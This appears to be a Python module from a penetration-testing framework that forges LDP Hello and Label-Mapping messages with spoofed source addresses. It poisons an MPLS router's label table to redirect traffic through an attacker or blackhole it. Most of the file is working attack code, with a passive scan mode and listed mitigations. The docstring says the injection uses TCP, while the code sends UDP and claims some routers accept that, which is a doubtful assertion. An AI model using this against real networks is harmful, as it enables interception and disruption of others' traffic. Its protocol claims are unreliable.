"""
LDP Label-Mapping Injection — T1557

Forges LDP (Label Distribution Protocol, RFC 5036) TCP session and
injects Label-Mapping messages to poison the target LSR's LFIB —
redirecting labeled traffic through the attacker.

Difference from the `mpls` module:
  mpls  → injects an MPLS-encapsulated frame (label-stack on Ethernet)
  ldp   → forges LDP protocol messages (TCP/646) to create fake
           label bindings in the peer's Label FIB

Two modes:
  scan   — passive sniff for LDP Hello (UDP/646 → 224.0.0.2) to
           discover LDP Router-IDs and transport addresses on the
           segment. No packets sent; safe for customer demo.
  inject — send a crafted LDP Label-Mapping message via raw TCP to
           the target LSR's LDP transport address. Binds a chosen
           FEC (prefix) to a label the attacker controls.
           If the LSR accepts → LFIB poisoned → labeled traffic for
           that FEC is forwarded with attacker's label → MITM / blackhole.

Prerequisites:
  - Attacker must be on the same segment as the target PE/P router
  - LDP Hello adjacency must form (no LDP MD5 auth)
  - Target must accept unsolicited label mappings (Downstream Unsolicited)

Mitigation: LDP MD5 authentication, label filtering (mpls label
range, mpls label protocol ldp neighbor filter), TTL-security.
"""
import struct
import time

from scapy.all import Ether, IP, UDP, Raw, sendp, sniff, hexdump, send

NAME = "ldp"
DESCRIPTION = "LDP label-mapping injection — poison LFIB with forged FEC-label bindings"
ATTCK_ID = "T1557"

LDP_MCAST = "224.0.0.2"
LDP_PORT = 646


def register(subparsers, add_engagement_args):
    p = subparsers.add_parser(NAME, help=f"{DESCRIPTION} ({ATTCK_ID})",
                              description=__doc__)
    p.add_argument("-i", "--interface", required=True)
    p.add_argument("--mode", choices=["scan", "inject"], default="scan")
    p.add_argument("--target", default=None,
                   help="Target LSR transport address (for inject mode)")
    p.add_argument("--lsr-id", default="10.255.255.1",
                   help="Attacker's LDP Router-ID (spoofed)")
    p.add_argument("--fec", default="10.0.0.0/24",
                   help="FEC prefix to bind a label to (e.g. 10.0.0.0/24)")
    p.add_argument("--label", type=int, default=1000,
                   help="Label to bind to the FEC (16-1048575)")
    p.add_argument("-s", "--spoof-ip", default=None,
                   help="Spoofed source IP (default: lsr-id)")
    p.add_argument("--label-space", type=int, default=0,
                   help="LDP label-space ID (usually 0)")
    p.add_argument("--timeout", type=int, default=20,
                   help="Scan window seconds")
    p.add_argument("-c", "--count", type=int, default=10)
    p.add_argument("--interval", type=float, default=2.0)
    p.add_argument("--dry-run", action="store_true")
    p.add_argument("--verbose", "-v", action="store_true")
    add_engagement_args(p)
    p.set_defaults(func=run)


def _ip_to_bytes(ip):
    """Convert dotted-quad IP to 4 bytes."""
    return bytes(int(x) for x in ip.split("."))


# ── LDP PDU / Message builders (RFC 5036) ────────────────────────────────────

def _build_ldp_header(lsr_id, label_space, body):
    """
    LDP PDU Header (RFC 5036 §3.5.1):
      Version (2) | PDU Length (2) | LSR-ID (4) | Label Space (2)
    """
    version = 1
    pdu_len = 6 + len(body)  # LSR-ID(4) + LabelSpace(2) + body
    hdr = struct.pack("!HH", version, pdu_len)
    hdr += _ip_to_bytes(lsr_id)
    hdr += struct.pack("!H", label_space)
    return hdr + body


def _build_hello_message(lsr_id, hold_time=15):
    """
    LDP Hello message (type 0x0100) with Common Hello Params TLV.
    Sent to 224.0.0.2:646 to establish adjacency.
    """
    # Common Hello Parameters TLV (type 0x0400)
    # Hold Time (2) | Flags (2): T=0 (link hello), R=0
    chp_value = struct.pack("!HH", hold_time, 0)
    chp_tlv = struct.pack("!HH", 0x0400, len(chp_value)) + chp_value

    # Transport Address TLV (type 0x0401) — our LSR-ID
    ta_value = _ip_to_bytes(lsr_id)
    ta_tlv = struct.pack("!HH", 0x0401, len(ta_value)) + ta_value

    msg_body = chp_tlv + ta_tlv
    # Message header: Type(2) | Length(2) | Message-ID(4)
    msg_id = 1
    msg = struct.pack("!HHI", 0x0100, len(msg_body) + 4, msg_id) + msg_body
    return msg


def _build_label_mapping_message(fec_prefix, fec_prefixlen, label, msg_id=2):
    """
    LDP Label Mapping message (type 0x0400) — RFC 5036 §3.5.7
    Contains FEC TLV + Generic Label TLV.

    This is the core of the attack: the peer stores this binding
    in its LFIB (FEC → label).
    """
    # ── FEC TLV (type 0x0100) ─────────────────────────────────────────────
    # FEC Element: Prefix (type 2)
    #   type(1) | addr-family(2) | prefixlen(1) | prefix(variable)
    import ipaddress
    net = ipaddress.IPv4Network(f"{fec_prefix}/{fec_prefixlen}", strict=False)
    prefix_bytes_len = (fec_prefixlen + 7) // 8
    prefix_bytes = net.network_address.packed[:prefix_bytes_len]

    fec_elem = struct.pack("!BHB", 2, 1, fec_prefixlen) + prefix_bytes  # type=Prefix, AF=IPv4
    fec_tlv = struct.pack("!HH", 0x0100, len(fec_elem)) + fec_elem

    # ── Generic Label TLV (type 0x0200) ───────────────────────────────────
    label_value = struct.pack("!I", label)
    label_tlv = struct.pack("!HH", 0x0200, len(label_value)) + label_value

    msg_body = fec_tlv + label_tlv
    # Message header: Type 0x0400 (Label Mapping)
    msg = struct.pack("!HHI", 0x0400, len(msg_body) + 4, msg_id) + msg_body
    return msg


# ── Scan mode ─────────────────────────────────────────────────────────────────

def _scan(args, logger):
    """Passive scan for LDP Hello messages on the segment."""
    logger.info("[LDP] scan %ds on %s — listening for LDP Hello (UDP/646 → 224.0.0.2) ...",
                args.timeout, args.interface)
    peers = {}

    def handler(pkt):
        try:
            if not (pkt.haslayer(UDP) and pkt[UDP].dport == LDP_PORT):
                return
            if not pkt.haslayer(IP):
                return
            src_ip = pkt[IP].src
            raw = bytes(pkt[UDP].payload) if pkt.haslayer(Raw) else bytes(pkt[UDP].payload)
            if len(raw) < 10:
                return
            # Parse LDP PDU header: version(2) pdu_len(2) lsr_id(4) label_space(2)
            version = struct.unpack("!H", raw[0:2])[0]
            lsr_id_bytes = raw[4:8]
            lsr_id = ".".join(str(b) for b in lsr_id_bytes)
            label_space = struct.unpack("!H", raw[8:10])[0]
            if lsr_id not in peers:
                peers[lsr_id] = {"src_ip": src_ip, "label_space": label_space, "count": 0}
                logger.info("[LDP] NEW peer: LSR-ID=%s  transport=%s  label-space=%d",
                            lsr_id, src_ip, label_space)
            peers[lsr_id]["count"] += 1
        except Exception:
            pass

    sniff(iface=args.interface, prn=handler, store=False, timeout=args.timeout,
          filter="udp dst port 646")

    logger.info("[LDP] scan done: %d unique LSR peers discovered", len(peers))
    for lsr, info in peers.items():
        logger.info("  LSR-ID=%-16s  transport=%-16s  hellos=%d",
                    lsr, info["src_ip"], info["count"])

    if not peers:
        logger.warning("[LDP] No LDP Hellos seen — LDP may not be enabled on this segment.")
    else:
        logger.info("[LDP] Peers found — inject mode viable if no MD5 auth is set.")
    return True


# ── Inject mode ───────────────────────────────────────────────────────────────

def _inject(args, logger):
    """
    Send forged LDP Hello + Label-Mapping to poison LFIB.

    Attack flow:
      1. Send LDP Hello (UDP/646 → 224.0.0.2) to establish adjacency
      2. Send LDP Label-Mapping via UDP to target transport address
         (real LDP uses TCP, but UDP injection bypasses TCP handshake;
          some implementations accept UDP label messages for backward compat)
    """
    import ipaddress

    if args.target is None:
        logger.error("--target is required for inject mode (target LSR transport address)")
        return False
    if not 16 <= args.label <= 1048575:
        logger.error("Label must be 16-1048575 (0-15 reserved)")
        return False

    net = ipaddress.IPv4Network(args.fec, strict=False)
    fec_prefix = str(net.network_address)
    fec_prefixlen = net.prefixlen
    src_ip = args.spoof_ip or args.lsr_id

    # ── Step 1: LDP Hello (adjacency) ────────────────────────────────────
    hello_body = _build_hello_message(args.lsr_id)
    hello_pdu = _build_ldp_header(args.lsr_id, args.label_space, hello_body)

    hello_pkt = (IP(src=src_ip, dst=LDP_MCAST, ttl=1) /
                 UDP(sport=LDP_PORT, dport=LDP_PORT) /
                 Raw(load=hello_pdu))

    # ── Step 2: Label-Mapping (LFIB poison) ───────────────────────────────
    mapping_body = _build_label_mapping_message(fec_prefix, fec_prefixlen, args.label)
    mapping_pdu = _build_ldp_header(args.lsr_id, args.label_space, mapping_body)

    mapping_pkt = (IP(src=src_ip, dst=args.target) /
                   UDP(sport=LDP_PORT, dport=LDP_PORT) /
                   Raw(load=mapping_pdu))

    if args.dry_run:
        logger.info("--dry-run: LDP Hello preview")
        hello_pkt.show()
        logger.info("--dry-run: LDP Label-Mapping preview")
        mapping_pkt.show()
        logger.info("FEC=%s/%d → label=%d  LSR-ID=%s → target=%s",
                    fec_prefix, fec_prefixlen, args.label, args.lsr_id, args.target)
        hexdump(bytes(mapping_pdu))
        return True

    try:
        for i in range(args.count):
            # Send Hello first to maintain adjacency
            send(hello_pkt, iface=args.interface, verbose=args.verbose)
            time.sleep(0.1)
            # Send Label-Mapping to poison LFIB
            send(mapping_pkt, iface=args.interface, verbose=args.verbose)
            logger.info("[LDP] %d/%d  Hello+LabelMapping  FEC=%s/%d→label=%d  target=%s",
                        i + 1, args.count, fec_prefix, fec_prefixlen, args.label, args.target)
            time.sleep(args.interval)

        logger.info("[LDP] Done — check 'show mpls ldp bindings' / 'show mpls forwarding-table' on peer")
        logger.info("[LDP] If label accepted → LFIB poisoned, traffic for %s/%d uses label %d",
                    fec_prefix, fec_prefixlen, args.label)
        logger.info("[LDP] If rejected → MD5 auth or label filtering is working (good finding)")
        return True
    except Exception as e:
        logger.error("[LDP] Error: %s", e)
        return False


def run(args, logger):
    from core.common import require_root
    require_root()
    logger.info("START | technique=%s | iface=%s | mode=%s",
                ATTCK_ID, args.interface, args.mode)
    ok = _scan(args, logger) if args.mode == "scan" else _inject(args, logger)
    logger.info("END | success=%s", ok)
    return 0 if ok else 1
